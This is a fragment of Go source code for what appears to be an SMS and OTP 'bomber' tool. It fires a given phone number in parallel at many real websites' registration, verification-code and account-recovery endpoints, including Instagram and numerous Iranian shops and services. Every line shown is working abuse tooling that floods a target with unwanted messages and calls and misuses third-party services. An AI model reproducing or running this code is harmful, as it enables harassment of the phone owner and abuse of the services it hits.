		launch("https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", map[string]interface{}{fmt.Sprintf("'Token':'5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c','DeviceId':1,'PhoneNumber':%s,'Helper':77942", phone): phone}, ch)
		launch("https://ashraafi.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=%s&dig_otp=&dig_nounce=54dfdabe34", phone, phone): phone}, ch)
		launch("https://bandarazad.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%%2B98&digits_reg_mail=%s&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a", phone, phone): phone}, ch)
		launch("https://bazidone.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=%s&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2", phone, phone): phone}, ch)
		launch("https://www.bigtoys.ir/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%%D8%%A8%%DB%%8C%%D8%%A8%%D9%%84%%DB%%8C%%D9%%84&digregcode=%%2B98&digits_reg_mail=%s&digregscode2=%%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4", phone, phone): phone}, ch)
		launch(fmt.Sprintf("https://bitex24.com/api/v1/auth/sendSms?mobile=%s&dial_code=0", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://farsgraphic.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%%D9%%86%%DB%%8C%%D9%%85%%D9%%86%%D9%%85%%D9%%85%%D9%%86%%DB%%8C%%D8%%B3&digits_reg_lastname=%%D9%%85%%D9%%86%%D8%%B3%%DB%%8C%%D8%%B2%%D8%%AA%%D9%%86&digregscode2=%%2B98&mobmail2=&digregcode=%%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3", phone, phone): phone}, ch)
		launch("https://www.instagram.com/accounts/account_recovery_send_ajax/", map[string]interface{}{fmt.Sprintf("email_or_username=%%2B%s&recaptcha_challenge_field=&flow=&app_id=&source_account_id=", phone): phone}, ch)
		launch("https://shop.hemat-elec.ir/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%%2B98&mobmail2=&digregcode=%%2B98&digits_reg_mail=%s&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828", phone, phone): phone}, ch)
		launch("https://www.mipersia.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%%2B98&digits_reg_mail=%s&digregscode2=%%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72", phone, phone): phone}, ch)
		launch("https://www.kodakamoz.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%%D9%%84%%D8%%A8%%D8%%A8%%DB%%8C%%DB%%8C%%D8%%A8%%D8%%AB%%D9%%82%%D8%%AD&digits_reg_displayname=%%D8%%A8%%D8%%A8%%D8%%A8%%DB%%8C%%D8%%B1%%D8%%A8%%D9%%84%%D9%%84%%DB%%8C%%D8%%A8%%D9%%84&digregscode2=%%2B98&mobmail2=&digregcode=%%2B98&digits_reg_mail=%s&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc", phone, phone): phone}, ch)
		launch("https://tajtehran.com/RegisterRequest", map[string]interface{}{fmt.Sprintf("mobile=%s&password=mamad1234", phone): phone}, ch)
		launch("https://zivanpet.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b", phone, phone): phone}, ch)
		launch("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{fmt.Sprintf("'mobile':%s,'deviceTypeCode':0,'confirmTerms':'True','notRobot':'False'", phone): phone}, ch)
		launch("https://client.api.paklean.com/user/resendVoiceCode", map[string]interface{}{"username": phone}, ch)
		launch("https://web.raghamapp.com/api/users/code", map[string]interface{}{"phone": phone}, ch)
		launch("https://gateway.trip.ir/api/registers", map[string]interface{}{"CellPhone": phone}, ch)
		launch("https://gateway.trip.ir/api/Totp", map[string]interface{}{"PhoneNumber": phone}, ch)
	}

	wg.Wait()
	close(ch)
	<-done

	mu.Lock()
	fmt.Printf("\033[01;32m[\033[01;32m+\033[01;31m] \033[01;33mDone: %d responses received.\n\033[00m", received)
	mu.Unlock()
}